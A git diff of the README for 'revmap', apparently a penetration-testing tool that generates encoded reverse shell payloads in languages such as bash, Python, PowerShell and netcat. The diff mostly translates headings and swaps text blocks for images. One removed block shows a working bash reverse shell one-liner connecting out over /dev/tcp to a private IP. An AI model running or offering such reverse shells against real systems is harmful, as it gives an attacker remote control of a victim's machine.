@@ -2,14 +2,19 @@
 
 ![logo_do_projeto](assets/revmap.png){.center}
 
-<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>
+<p align="center">
+	<a href="https://www.python.org/"><img src="https://img.shields.io/badge/made%20with-python-red"></a>
+	<a href="#"><img src="https://img.shields.io/badge/platform-osx%2Flinux%2Fwindows-blueviolet"></a>
+	<a href="https://github.com/joaoviictorti/revmap/releases"><img src="https://img.shields.io/github/release/joaoviictorti/revmap?color=blue"></a>
+</p>
 
+<h4 align="center">Ferramenta que gera shell reverso em várias linguagens de programação e codifica</h4>
 
 <p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revmap">Usage</a>
+  <a href="#características">Características</a> •
+  <a href="#instalação">Instalação</a> •
+  <a href="#forma-de-utilização"> Forma de utilização</a> •
+  <a href="#executando-revmap">Executando revmap</a>
 </p>
 
 ---
@@ -32,22 +37,9 @@ revmap --ip 192.168.4.80 --port 4444 --payload bash
 revmap --ip 192.168.4.80 --port 4444 --payload python
 revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
 ```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
+# Detalhes
 
-options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
-```
+![revmap_console](assets/help.png)
 
 # Instalação
 
@@ -59,18 +51,7 @@ pip3 install revmap
 
 # Executando revmap
 
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
+![revmap_console](assets/revmap_console.png)
 
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
